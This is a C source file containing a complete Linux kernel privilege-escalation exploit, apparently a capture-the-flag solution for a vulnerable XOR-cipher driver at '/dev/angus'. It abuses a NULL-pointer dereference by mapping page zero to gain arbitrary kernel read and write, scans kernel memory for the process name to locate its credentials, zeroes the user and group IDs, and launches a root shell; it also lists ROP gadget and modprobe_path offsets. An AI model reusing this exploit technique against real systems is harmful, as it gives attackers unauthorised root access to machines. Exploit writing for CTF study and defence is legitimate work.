#include <fcntl.h>
#include <pthread.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/mman.h>
#include <sys/prctl.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc3afe0
#define addr_modprobe_path (kbase + 0xe38480)
#define rop_mov_qrdx_rcx (kbase + 0x48687)
#define rop_mov_rax_qrdx (kbase + 0x3aadf9)

typedef struct {
    char* key;
    char* data;
    size_t keylen;
    size_t datalen;
} XorCipher;

typedef struct {
    char* ptr;
    size_t len;
} request_t;

#define CMD_INIT 0x13370001
#define CMD_SETKEY 0x13370002
#define CMD_SETDATA 0x13370003
#define CMD_GETDATA 0x13370004
#define CMD_ENCRYPT 0x13370005
#define CMD_DECRYPT 0x13370006

uint32_t fd;
XorCipher* nullptr = 0;

uint32_t angus_open()
{
    uint32_t fd_angus = open("/dev/angus", O_RDWR);
    if (fd_angus == -1) {
        ERROR("/dev/angus");
    }
    return fd_angus;
}

void angus_close()
{
    close(fd);
}

int32_t angus_init()
{
    request_t req = { NULL };
    return ioctl(fd, CMD_INIT, &req);
}

int32_t angus_setkey(char* key, size_t keylen)
{
    request_t req = { .ptr = key, .len = keylen };
    return ioctl(fd, CMD_SETKEY, &req);
}

int32_t angus_setdata(char* data, size_t datalen)
{
    request_t req = { .ptr = data, .len = datalen };
    return ioctl(fd, CMD_SETDATA, &req);
}

int32_t angus_getdata(char* buf, size_t len)
{
    request_t req = { .ptr = buf, .len = len };
    return ioctl(fd, CMD_GETDATA, &req);
}

int32_t angus_flipcrypt()
{
    request_t req = { NULL };
    return ioctl(fd, CMD_ENCRYPT, &req);
}

uint32_t AAR(char* dst, char* src, size_t len)
{
    nullptr->data = src;
    nullptr->datalen = len;
    return angus_getdata(dst, len);
}

void AAW(char* dst, char* src, size_t len)
{
    char* tmp = malloc(len);
    AAR(tmp, dst, len);

    for (int i = 0; i < len; i++) {
        tmp[i] ^= src[i];
    }

    nullptr->data = dst;
    nullptr->datalen = len;
    nullptr->key = tmp;
    nullptr->keylen = len;

    // dst ^ (dst ^ src) = src
    angus_flipcrypt();

    free(tmp);
}

int main()
{
    fd = angus_open();

    if (mmap(0, 0x1000, PROT_READ | PROT_WRITE, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS | MAP_POPULATE, -1, 0) != 0)
        ERROR("mmap");

    prctl(PR_SET_NAME, "nekomaru");
    unsigned long addr;
    size_t stride = 0x1000000;
    char *needle, *buf = malloc(stride);

    for (addr = 0xffff888000000000; addr < 0xffffc88000000000; addr += stride) {
        if (addr % 0x10000000000 == 0)
            printf("[*] Searching 0x%016lx...\n", addr);

        if (AAR(buf, (char*)addr, stride) != 0)
            continue;

        if (needle = memmem(buf, stride, "nekomaru", 8)) {
            addr += (needle - buf);
            printf("[+] Found comm: 0x%016lx\n", addr);
            break;
        }
    }

    if (addr == 0xffffc88000000000) {
        ERROR("Not found");
        exit(1);
    }

    uint64_t addr_cred = 0;
    AAR(&addr_cred, addr - 0x8, 0x8);
    SUCCESS("current->cred = 0x%016lx", addr_cred);

    // 実効IDの上書き
    for (int i = 1; i <= 8; i++) {
        AAW(addr_cred + i * 4, "\x00\x00\x00\x00", 0x4);
    }

    SUCCESS("pwned!");
    system("/bin/sh");


    return 0;

 



    return 0;
}